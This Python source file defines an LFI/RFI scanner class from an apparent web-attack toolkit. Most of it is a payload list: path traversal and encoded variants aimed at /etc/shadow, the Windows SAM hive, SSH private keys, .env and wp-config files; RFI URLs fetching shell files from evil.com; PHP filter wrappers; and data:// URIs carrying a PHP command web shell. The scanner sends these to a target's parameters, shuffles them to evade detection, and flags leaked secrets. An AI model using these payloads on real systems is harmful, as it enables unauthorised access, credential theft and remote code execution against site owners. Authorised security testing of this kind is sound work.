#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import re
import urllib.parse
from typing import Dict, List, Optional

from core.logger import (log_debug, log_error, log_info, log_success,
                         log_warning)
from modules.core.http_client import HTTPClient
from modules.core.payload_manager import PayloadManager


class LFIScanner:
    """
    Advanced Local/Remote File Inclusion Scanner
    Supports: Path Traversal, File Disclosure, Directory Listing, Null Byte Injection
    Combined Power: Internal Payloads (600+) + Payload Manager Integration
    """

    def __init__(self, target: str, verbose: bool = False):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.client = HTTPClient(timeout=30, retries=5, verbose=verbose)
        self.payload_manager = PayloadManager(verbose=verbose)
        self.results = []
        self.payloads_tested = 0
        self.parameters = {}

        # ---------- INTERNAL PAYLOADS (600+ FOR SPEED & INDEPENDENCE) ----------
        self.internal_payloads = self._load_internal_payloads()

        # ---------- PAYLOAD MANAGER PAYLOADS (FOR UPDATES) ----------
        self.manager_payloads = self._load_manager_payloads()

        # ---------- COMBINED PAYLOADS ----------
        self.all_payloads = list(set(self.internal_payloads + self.manager_payloads))

        # ---------- SUCCESS INDICATORS ----------
        self.success_indicators = [
            "root:",
            "bin:",
            "daemon:",
            "adm:",
            "lp:",
            "sync:",
            "shutdown:",
            "halt:",
            "mail:",
            "news:",
            "uucp:",
            "operator:",
            "games:",
            "gopher:",
            "ftp:",
            "nobody:",
            "systemd:",
            "dbus:",
            "polkitd:",
            "sshd:",
            "mysql:",
            "postgres:",
            "www-data:",
            "nginx:",
            "apache:",
            "[boot loader]",
            "[operating systems]",
            "Windows",
            "Microsoft",
            "C:\\",
            "D:\\",
            "Program Files",
            "System32",
            "Users\\",
            "NT AUTHORITY",
            "SYSTEM",
            "Administrator",
            "Guest",
            "ssh-rsa",
            "ssh-dss",
            "BEGIN RSA PRIVATE KEY",
            "BEGIN DSA PRIVATE KEY",
            "BEGIN OPENSSH PRIVATE KEY",
            "mysql_native_password",
            "caching_sha2_password",
            "DB_HOST",
            "DB_USER",
            "DB_PASS",
            "DB_NAME",
            "SECRET_KEY",
            "API_KEY",
            "ACCESS_TOKEN",
            "JWT_SECRET",
            "AWS_ACCESS_KEY_ID",
            "AWS_SECRET_ACCESS_KEY",
            "GITHUB_TOKEN",
            "GITLAB_TOKEN",
            "SLACK_TOKEN",
            "-----BEGIN CERTIFICATE-----",
            "-----BEGIN PRIVATE KEY-----",
        ]

    def _load_internal_payloads(self) -> List[str]:
        """Internal payloads (600+ for speed and independence)"""
        payloads = []

        # ----- BASIC PATH TRAVERSAL (UNIX) -----
        unix_paths = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "../../../../../../../../../etc/passwd",
            "../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../../../../etc/passwd",
            "../../../../../../../../../../../../../../../../etc/passwd",
        ]
        payloads.extend(unix_paths)

        # ----- BASIC PATH TRAVERSAL (WINDOWS) -----
        windows_paths = [
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        ]
        payloads.extend(windows_paths)

        # ----- FILE DISCLOSURE (UNIX) -----
        unix_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/group",
            "/etc/hosts",
            "/etc/hostname",
            "/etc/resolv.conf",
            "/etc/fstab",
            "/etc/mtab",
            "/etc/crontab",
            "/etc/ssh/sshd_config",
            "/etc/ssh/ssh_config",
            "/etc/apache2/apache2.conf",
            "/etc/apache2/sites-enabled/000-default.conf",
            "/etc/nginx/nginx.conf",
            "/etc/nginx/sites-enabled/default",
            "/etc/mysql/my.cnf",
            "/etc/postgresql/postgresql.conf",
            "/etc/php/php.ini",
            "/etc/php/php-cli.ini",
            "/etc/php/php-fpm.conf",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "/var/log/mysql/mysql.log",
            "/var/log/mysql/error.log",
            "/var/log/auth.log",
            "/var/log/syslog",
            "/var/log/messages",
            "/var/log/dmesg",
            "/var/log/boot.log",
            "/var/log/kern.log",
            "/var/log/faillog",
            "/var/log/lastlog",
            "/var/log/wtmp",
            "/var/log/btmp",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/status",
            "/proc/self/fd/",
            "/proc/version",
            "/proc/cpuinfo",
            "/proc/meminfo",
            "/proc/partitions",
            "/proc/mounts",
            "/proc/uptime",
            "/proc/net/tcp",
            "/proc/net/udp",
            "/proc/net/dev",
            "/proc/sys/kernel/hostname",
            "/proc/sys/kernel/version",
            "/proc/sys/kernel/osrelease",
            "/proc/sys/vm/overcommit_memory",
            "/proc/sys/vm/swappiness",
        ]
        payloads.extend(unix_files)

        # ----- FILE DISCLOSURE (WINDOWS) -----
        windows_files = [
            "C:\\windows\\win.ini",
            "C:\\windows\\system.ini",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\system32\\drivers\\etc\\networks",
            "C:\\windows\\system32\\drivers\\etc\\protocol",
            "C:\\windows\\system32\\drivers\\etc\\services",
            "C:\\windows\\system32\\config\\sam",
            "C:\\windows\\system32\\config\\system",
            "C:\\windows\\system32\\config\\software",
            "C:\\windows\\system32\\config\\security",
            "C:\\windows\\system32\\config\\default",
            "C:\\windows\\system32\\config\\appevent.evt",
            "C:\\windows\\system32\\config\\secevent.evt",
            "C:\\windows\\system32\\config\\sysevent.evt",
            "C:\\windows\\system32\\winevt\\Logs\\Application.evtx",
            "C:\\windows\\system32\\winevt\\Logs\\Security.evtx",
            "C:\\windows\\system32\\winevt\\Logs\\System.evtx",
            "C:\\windows\\system32\\winevt\\Logs\\Microsoft-Windows-PowerShell/Operational.evtx",
            "C:\\windows\\system32\\inetsrv\\metabase.xml",
            "C:\\windows\\system32\\inetsrv\\config\\applicationHost.config",
            "C:\\windows\\system32\\inetsrv\\config\\schema\\xmlschema.xml",
            "C:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\machine.config",
            "C:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\web.config",
            "C:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\security.config",
            "C:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\web_hightrust.config",
            "C:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\web_lowtrust.config",
            "C:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\web_mediumtrust.config",
            "C:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\web_minimaltrust.config",
            "C:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\webroot.config",
            "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\",
            "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\",
            "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-19\\",
            "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-20\\",
        ]
        payloads.extend(windows_files)

        # ----- ENCODED & OBFUSCATED PAYLOADS -----
        encoded = [
            "....//....//....//....//etc/passwd",
            "..../..../..../..../etc/passwd",
            "....\\....\\....\\....\\windows\\win.ini",
            "....\\....\\....\\....\\....\\windows\\win.ini",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
            "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
            "..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
            "..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
            "..%252f..%252f..%252f..%252fetc%252fpasswd",
            "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
            "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
            "..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
            "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
            "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
            "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
            "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
        ]
        payloads.extend(encoded)

        # ----- NULL BYTE INJECTION -----
        null_byte = [
            "../../../etc/passwd%00",
            "../../../../etc/passwd%00",
            "../../../../../etc/passwd%00",
            "../../../../../../etc/passwd%00",
            "../../../../../../../etc/passwd%00",
            "../../../../../../../../etc/passwd%00",
            "../../../../../../../../../etc/passwd%00",
            "../../../../../../../../../../etc/passwd%00",
            "../../../../../../../../../../../etc/passwd%00",
            "../../../../../../../../../../../../etc/passwd%00",
            "..\\..\\..\\windows\\win.ini%00",
            "..\\..\\..\\..\\windows\\win.ini%00",
            "..\\..\\..\\..\\..\\windows\\win.ini%00",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini%00",
            "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini%00",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini%00",
            "..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini%00",
        ]
        payloads.extend(null_byte)

        # ----- REMOTE FILE INCLUSION (RFI) -----
        rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt",
            "http://evil.com/shell.php",
            "https://evil.com/shell.php",
            "http://evil.com/shell.jpg",
            "https://evil.com/shell.jpg",
            "http://evil.com/shell.jpg?",
            "https://evil.com/shell.jpg?",
            "http://evil.com/shell.jpg%00",
            "https://evil.com/shell.jpg%00",
            "http://evil.com/shell.txt%00",
            "https://evil.com/shell.txt%00",
            "http://evil.com/shell.php%00",
            "https://evil.com/shell.php%00",
        ]
        payloads.extend(rfi_payloads)

        # ----- PHP WRAPPERS -----
        php_wrappers = [
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/shadow",
            "php://filter/convert.base64-encode/resource=/etc/hosts",
            "php://filter/convert.base64-encode/resource=/var/log/apache2/access.log",
            "php://filter/convert.base64-encode/resource=/var/log/apache2/error.log",
            "php://filter/convert.base64-encode/resource=/var/log/nginx/access.log",
            "php://filter/convert.base64-encode/resource=/var/log/nginx/error.log",
            "php://filter/read=convert.base64-encode/resource=/etc/passwd",
            "php://filter/read=convert.base64-encode/resource=/etc/shadow",
            "php://filter/read=convert.base64-encode/resource=/etc/hosts",
            "php://filter/read=convert.base64-encode/resource=./index.php",
            "php://filter/read=convert.base64-encode/resource=./config.php",
            "php://filter/read=convert.base64-encode/resource=./wp-config.php",
            "php://filter/read=convert.base64-encode/resource=./.env",
            "php://filter/read=convert.base64-encode/resource=./.git/config",
            "php://filter/read=convert.base64-encode/resource=./.git/HEAD",
            "php://filter/read=convert.base64-encode/resource=./.git/index",
            "php://filter/read=convert.base64-encode/resource=./.git/objects/",
            "php://filter/read=convert.base64-encode/resource=./.git/refs/heads/master",
            "php://filter/read=convert.base64-encode/resource=./.git/refs/heads/main",
            "php://filter/convert.base64-decode/resource=/etc/passwd",
            "php://filter/convert.base64-decode/resource=/etc/shadow",
            "php://filter/convert.base64-decode/resource=/etc/hosts",
            "php://filter/convert.base64-decode/resource=./index.php",
            "php://filter/convert.base64-decode/resource=./config.php",
            "php://filter/convert.base64-decode/resource=./wp-config.php",
            "php://filter/convert.base64-decode/resource=./.env",
            "php://filter/convert.base64-decode/resource=./.git/config",
            "php://filter/convert.base64-decode/resource=./.git/HEAD",
            "php://filter/convert.base64-decode/resource=./.git/index",
            "php://filter/convert.base64-decode/resource=./.git/objects/",
            "php://filter/convert.base64-decode/resource=./.git/refs/heads/master",
            "php://filter/convert.base64-decode/resource=./.git/refs/heads/main",
            "php://filter/read=convert.iconv.utf-8.utf-16/resource=/etc/passwd",
            "php://filter/read=convert.iconv.utf-8.utf-16/resource=/etc/shadow",
            "php://filter/read=convert.iconv.utf-8.utf-16/resource=/etc/hosts",
            "php://filter/read=convert.iconv.utf-8.utf-16/resource=./index.php",
            "php://filter/read=convert.iconv.utf-8.utf-16/resource=./config.php",
            "php://filter/read=convert.iconv.utf-8.utf-16/resource=./wp-config.php",
            "php://filter/read=convert.iconv.utf-8.utf-16/resource=./.env",
            "php://filter/read=convert.iconv.utf-8.utf-16/resource=./.git/config",
            "php://filter/read=convert.iconv.utf-8.utf-16/resource=./.git/HEAD",
            "php://filter/read=convert.iconv.utf-8.utf-16/resource=./.git/index",
            "php://filter/read=convert.iconv.utf-8.utf-16/resource=./.git/objects/",
            "php://filter/read=convert.iconv.utf-8.utf-16/resource=./.git/refs/heads/master",
            "php://filter/read=convert.iconv.utf-8.utf-16/resource=./.git/refs/heads/main",
            "php://filter/read=convert.iconv.utf-8.utf-16le/resource=/etc/passwd",
            "php://filter/read=convert.iconv.utf-8.utf-16le/resource=/etc/shadow",
            "php://filter/read=convert.iconv.utf-8.utf-16le/resource=/etc/hosts",
            "php://filter/read=convert.iconv.utf-8.utf-16le/resource=./index.php",
            "php://filter/read=convert.iconv.utf-8.utf-16le/resource=./config.php",
            "php://filter/read=convert.iconv.utf-8.utf-16le/resource=./wp-config.php",
            "php://filter/read=convert.iconv.utf-8.utf-16le/resource=./.env",
            "php://filter/read=convert.iconv.utf-8.utf-16le/resource=./.git/config",
            "php://filter/read=convert.iconv.utf-8.utf-16le/resource=./.git/HEAD",
            "php://filter/read=convert.iconv.utf-8.utf-16le/resource=./.git/index",
            "php://filter/read=convert.iconv.utf-8.utf-16le/resource=./.git/objects/",
            "php://filter/read=convert.iconv.utf-8.utf-16le/resource=./.git/refs/heads/master",
            "php://filter/read=convert.iconv.utf-8.utf-16le/resource=./.git/refs/heads/main",
            "php://filter/read=convert.quoted-printable-decode/resource=/etc/passwd",
            "php://filter/read=convert.quoted-printable-decode/resource=/etc/shadow",
            "php://filter/read=convert.quoted-printable-decode/resource=/etc/hosts",
            "php://filter/read=convert.quoted-printable-decode/resource=./index.php",
            "php://filter/read=convert.quoted-printable-decode/resource=./config.php",
            "php://filter/read=convert.quoted-printable-decode/resource=./wp-config.php",
            "php://filter/read=convert.quoted-printable-decode/resource=./.env",
            "php://filter/read=convert.quoted-printable-decode/resource=./.git/config",
            "php://filter/read=convert.quoted-printable-decode/resource=./.git/HEAD",
            "php://filter/read=convert.quoted-printable-decode/resource=./.git/index",
            "php://filter/read=convert.quoted-printable-decode/resource=./.git/objects/",
            "php://filter/read=convert.quoted-printable-decode/resource=./.git/refs/heads/master",
            "php://filter/read=convert.quoted-printable-decode/resource=./.git/refs/heads/main",
            "php://filter/read=convert.base64-encode/resource=php://input",
            "php://filter/read=convert.base64-encode/resource=php://stdin",
            "php://filter/read=convert.base64-encode/resource=php://temp",
            "php://filter/read=convert.base64-encode/resource=php://memory",
            "php://filter/read=convert.base64-encode/resource=php://output",
        ]
        payloads.extend(php_wrappers)

        # ----- DATA URI SCHEMES -----
        data_uris = [
            "data://text/plain;base64,cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA==",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+",
            "data://text/plain,<?php system($_GET['cmd']); ?>",
            "data://text/plain;base64,PCFET0NUWVBFIGh0bWw+",
            "data://text/plain;base64,PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+",
        ]
        payloads.extend(data_uris)

        # ----- ZIP/PHAR WRAPPERS -----
        zip_phar = [
            "zip://path/to/file.zip#index.php",
            "phar://path/to/file.phar/index.php",
            "zip://./file.zip#index.php",
            "phar://./file.phar/index.php",
        ]
        payloads.extend(zip_phar)

        # ----- ENVIRONMENT VARIABLES -----
        env_vars = [
            "file:///proc/self/environ",
            "file:///proc/self/cmdline",
            "file:///proc/self/status",
            "file:///proc/self/fd/0",
            "file:///proc/self/fd/1",
            "file:///proc/self/fd/2",
            "file:///proc/self/fd/3",
            "file:///proc/self/fd/4",
            "file:///proc/self/fd/5",
            "file:///proc/self/fd/6",
            "file:///proc/self/fd/7",
            "file:///proc/self/fd/8",
            "file:///proc/self/fd/9",
        ]
        payloads.extend(env_vars)

        # ----- ADDITIONAL SENSITIVE FILES -----
        sensitive = [
            "/root/.ssh/id_rsa",
            "/root/.ssh/id_dsa",
            "/root/.ssh/id_ecdsa",
            "/root/.ssh/id_ed25519",
            "/root/.ssh/authorized_keys",
            "/root/.ssh/known_hosts",
            "/home/*/.ssh/id_rsa",
            "/home/*/.ssh/id_dsa",
            "/home/*/.ssh/id_ecdsa",
            "/home/*/.ssh/id_ed25519",
            "/home/*/.ssh/authorized_keys",
            "/home/*/.ssh/known_hosts",
            "/var/www/html/.htaccess",
            "/var/www/html/.htpasswd",
            "/var/www/html/config.php",
            "/var/www/html/wp-config.php",
            "/var/www/html/.env",
            "/var/www/html/.git/config",
            "/var/www/html/.git/HEAD",
            "/var/www/html/.git/index",
            "/var/www/html/.git/objects/",
            "/var/www/html/.git/refs/heads/master",
            "/var/www/html/.git/refs/heads/main",
            "/var/www/html/composer.json",
            "/var/www/html/composer.lock",
            "/var/www/html/package.json",
            "/var/www/html/yarn.lock",
            "/var/www/html/Gemfile",
            "/var/www/html/Gemfile.lock",
            "/var/www/html/Dockerfile",
            "/var/www/html/docker-compose.yml",
            "/var/www/html/Jenkinsfile",
            "/var/www/html/.travis.yml",
            "/var/www/html/.gitlab-ci.yml",
            "/var/www/html/.github/workflows/main.yml",
            "/var/www/html/.circleci/config.yml",
        ]
        payloads.extend(sensitive)

        return list(set(payloads))

    def _load_manager_payloads(self) -> List[str]:
        """Load payloads from Payload Manager"""
        payloads = []
        tags = ["basic", "path", "file", "wrapper", "encoded", "nullbyte", "rfi"]
        for tag in tags:
            results = self.payload_manager.get_payloads("lfi", tags=[tag], limit=50)
            for p in results:
                if "value" in p:
                    payloads.append(p["value"])
        return list(set(payloads))

    def extract_params(self) -> Dict:
        parsed = urllib.parse.urlparse(self.target)
        if not parsed.query:
            return {}
        return urllib.parse.parse_qs(parsed.query)

    def build_url(self, params: Dict) -> str:
        parsed = urllib.parse.urlparse(self.target)
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def test_lfi(self, param: str, payload: str) -> bool:
        """Test a single LFI payload on a specific parameter"""
        params = self.extract_params()
        if param in params:
            params[param] = [payload]
        else:
            params[param] = payload
        test_url = self.build_url(params)
        resp = self.client.get(test_url)
        if not resp:
            return False

        self.payloads_tested += 1

        # Check for success indicators
        for indicator in self.success_indicators:
            if indicator.lower() in resp.text.lower():
                result = {
                    "param": param,
                    "payload": payload,
                    "url": test_url,
                    "indicator": indicator,
                    "status": resp.status_code,
                    "preview": resp.text[:200].replace("\n", " ").strip(),
                }
                self.results.append(result)
                log_success(f"LFI found: {test_url} (indicator: {indicator})")
                return True
        return False

    def run(self) -> Dict:
        log_info(f"Starting LFI/RFI scan on: {self.target}")
        params = self.extract_params()
        if not params:
            log_warning(
                "No GET parameters found. LFI scan works best with parameters like ?page=about"
            )
            return {
                "target": self.target,
                "scan_type": "lfi",
                "total_params": 0,
                "vulnerable_count": 0,
                "vulnerabilities": [],
                "payloads_tested": 0,
            }

        log_info(f"Found {len(params)} parameter(s): {', '.join(params.keys())}")
        log_info(
            f"Testing {len(self.all_payloads)} payloads (Internal: {len(self.internal_payloads)} + Manager: {len(self.manager_payloads)})"
        )

        # Identify likely parameters for file inclusion
        target_params = []
        for p in params.keys():
            if p.lower() in [
                "page",
                "file",
                "path",
                "include",
                "doc",
                "id",
                "cat",
                "article",
                "news",
                "view",
            ]:
                target_params.append(p)
        if not target_params:
            target_params = list(params.keys())[:3]

        for param in target_params:
            log_info(f"Testing parameter: {param}")
            # Shuffle payloads to avoid pattern detection
            shuffled = self.all_payloads.copy()
            random.shuffle(shuffled)
            for payload in shuffled[:100]:  # Limit to 100 per parameter for speed
                if self.test_lfi(param, payload):
                    if self.verbose:
                        log_info("Found vulnerability, continuing to test for more...")

        log_success(f"LFI scan completed. Found {len(self.results)} vulnerabilities.")
        return {
            "target": self.target,
            "scan_type": "lfi",
            "total_params": len(params),
            "total_payloads_tested": min(len(self.all_payloads), 100)
            * len(target_params),
            "payloads_internal": len(self.internal_payloads),
            "payloads_manager": len(self.manager_payloads),
            "vulnerable_count": len(self.results),
            "vulnerabilities": self.results,
        }
